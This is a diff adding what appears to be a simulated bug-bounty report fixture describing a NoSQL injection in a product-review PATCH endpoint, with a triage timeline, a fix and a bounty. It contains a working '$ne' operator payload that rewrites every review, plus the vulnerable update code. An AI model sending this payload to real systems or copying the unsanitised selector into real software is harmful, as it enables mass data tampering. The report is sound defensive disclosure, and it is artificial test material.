@@ -1,0 +1,59 @@
+id: BRM-052
+title: NoSQL injection in PATCH /rest/products/reviews rewrites every review at once
+vulnerability_information: |
+  ## Summary
+  `PATCH /rest/products/reviews` passes `req.body.id` straight into a Mongo
+  `update()` selector and runs it with `{multi:true}`. Supplying a query operator
+  instead of an id matches — and overwrites — every review document in one call.
+
+  ## Steps to reproduce
+  ```
+  PATCH {{base_url}}/rest/products/reviews HTTP/1.1
+  Authorization: Bearer <any logged-in user>
+  Content-Type: application/json
+
+  {"id":{"$ne":"-1"},"message":"pwned"}
+  ```
+
+  ## Observed result
+  ```
+  {"modified":<N>,"original":[...]}
+  ```
+  `modified` equals the total review count — every product review now reads
+  "pwned". The `$ne` selector matches all documents and `multi:true` applies the
+  `$set` to all of them.
+
+  ## Root cause
+  Caller-controlled object used directly as a NoSQL selector:
+  ```
+  reviewsCollection.update({ _id: req.body.id }, { $set: { message: req.body.message } }, { multi: true })
+  ```
+  No type check that `id` is a string/ObjectId, no scoping to the caller.
+impact: |
+  Mass tampering of all product reviews by any authenticated user — integrity
+  loss across the catalogue and a defacement/misinformation vector affecting
+  every shopper. High. CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L (6.5).
+timeline:
+  - after: 3h
+    by: team
+    do: comment
+    internal: true
+    message: Confirmed — $ne selector + multi:true rewrites all reviews. Same handler also has no author check (see incoming forged-review reports).
+  - after: 40m
+    by: team
+    do: state
+    state: triaged
+    message: Reproduced — a query operator in the id field does update every review. Triaged as high.
+  - after: 15m
+    by: team
+    do: severity
+    rating: high
+  - after: 8d
+    by: team
+    do: state
+    state: resolved
+    message: We now coerce id to a string before querying and dropped multi on this path, so a selector can only ever match one document you own. Thanks for the precise repro.
+  - after: 1d
+    by: team
+    do: bounty
+    amount: 1500
